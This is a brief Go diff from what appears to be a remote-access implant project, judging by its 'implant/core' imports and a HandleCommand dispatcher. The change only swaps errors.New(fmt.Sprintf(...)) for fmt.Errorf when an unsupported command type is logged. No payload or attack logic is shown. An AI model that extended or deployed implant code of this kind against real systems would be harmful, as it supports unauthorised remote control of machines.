@@ -2,7 +2,6 @@ package app
 
 import (
 	"encoding/binary"
-	"errors"
 	"fmt"
 	"implant/core/commands"
 	"implant/core/communication"
@@ -425,7 +424,7 @@ func HandleCommand(data []byte) {
 		callbackType = 0
 	default:
 		debuglog.Printf("❌ [命令错误] 不支持的命令类型: %d\n", cmdType)
-		err = errors.New(fmt.Sprintf("not supported command: %d", cmdType))
+		err = fmt.Errorf("not supported command: %d", cmdType)
 	}
 
 	if err != nil {
